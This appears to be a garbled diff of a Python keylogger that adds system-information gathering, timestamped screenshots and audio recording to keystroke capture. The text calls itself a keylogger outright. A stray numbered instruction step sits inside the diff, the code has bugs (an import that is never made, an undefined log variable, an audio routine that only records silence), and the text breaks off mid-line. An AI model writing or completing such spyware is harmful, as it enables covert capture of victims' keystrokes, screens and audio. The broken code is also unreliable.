@@ -1,13 +1,50 @@
 import keyboard
 import win32api
+from pynput.keyboard import Key, Controller
+import pyautogui
+import pydub
+import psutil
+import os
+import time
 
-def key_logger():
-    log = ""
+def get_system_info():
+    system_info = {}
+    system_info["OS"] = platform.system()
+    system_info["OS Release"] = platform.release()
+    system_info["OS Version"] = platform.version()
+    system_info["Machine"] = platform.machine()
+    system_info["Processor"] = platform.processor()
+    system_info["Hostname"] = platform.node()
+    return system_info
 
-    def on_press(key):
-        nonlocal log
+def take_screenshot():
+    screenshot_path = "screenshot_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".png"
+    pyautogui.screenshot(screenshot_path)
+
+def record_audio():
+    sample_rate = 400  # 16 kHz sample rate
+    seconds = 5  # Duration of the recording in seconds
+
+    audio = pydub.AudioSegment.empty()
+
+    for i in range(int(seconds * 10)):
+        audio.append(pydub.AudioSegment.silent(duration=10))
+
+    audio_path = "audio_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".wav"
+    audio.export(audio_path, format="wav")
+
+
+3. Create the main function to run the keylogger:
+```python
+def main():
+    system_info = get_system_info()
+    print("System Information:")
+    print(system_info)
+
+    while True:
+        # Keystroke logging
         try:
-            current_key = str(key.char)
+            current_key = str(keyboard.Key.char)
             if current_key.isalnum() or current_key == " ":
                 log += current_key
             elif current_key == "space":
@@ -51,39 +88,3 @@ def key_logger():
             elif current_key == "f1":
                 log += "[F1]"
             elif current_key == "f2":
-                log += "[F2]"
-            elif current_key == "f3":
-                log += "[F3]"
-            elif current_key == "f4":
-                log += "[F4]"
-            elif current_key == "f5":
-                log += "[F5]"
-            elif current_key == "f6":
-                log += "[F6]"
-            elif current_key == "f7":
-                log += "[F7]"
-            elif current_key == "f8":
-                log += "[F8]"
-            elif current_key == "f9":
-                log += "[F9]"
-            elif current_key == "f10":
-                log += "[F10]"
-            elif current_key == "f11":
-                log += "[F11]"
-            elif current_key == "f12":
-                log += "[F12]"
-        except AttributeError:
-            if key == win32api.VK_SHIFT:
-                log += "[SHIFT]"
-            elif key == win32api.VK_CONTROL:
-                log += "[CTRL]"
-            elif key == win32api.VK_MENU:
-                log += "[ALT]"
-            elif key == win32api.VK_ESCAPE:
-                log += "[ESC]"
-            elif key == win32api.VK_CAPITAL:
-                log += "[CAPS LOCK]"
-            elif key == win32api.VK_NUMLOCK:
-                log += "[NUM LOCK]"
-            elif key == win32api.VK_SCROLL:
-                log += "[
